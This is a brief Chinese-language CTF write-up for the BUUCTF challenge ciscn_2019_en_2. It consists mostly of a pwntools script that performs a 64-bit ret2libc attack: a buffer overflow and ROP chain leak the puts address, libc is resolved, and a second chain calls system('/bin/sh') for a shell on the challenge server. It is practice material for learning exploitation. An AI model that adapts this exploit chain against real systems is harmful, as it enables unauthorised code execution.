# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ciscn_2019_en_2)

这题是64位的ret2libc



------

# exp

```python
from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
p=remote('node5.buuoj.cn',29969)
#p=process('./ciscn_2019_en_2')
elf=ELF('./ciscn_2019_en_2')
pop_rdi=0x400c83
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=elf.sym['main']
ret_addr=0x4006b9

p.sendlineafter('choice!\n',b'1')
payload1= flat(b'\x00',b'A'*0x57,p64(pop_rdi),p64(puts_got),p64(puts_plt),p64(main_addr))
p.sendlineafter('encrypted\n',payload1)
puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print(hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')
print(hex(base))
system_addr=base+libc.dump('system')
bin_sh=base+libc.dump('str_bin_sh')
p.sendlineafter('choice!\n',b'1')

payload2=flat(b'\x00',b'A'*0x57,p64(ret_addr),p64(pop_rdi),p64(bin_sh),p64(system_addr))
p.sendlineafter('encrypted\n',payload2)
p.interactive()
```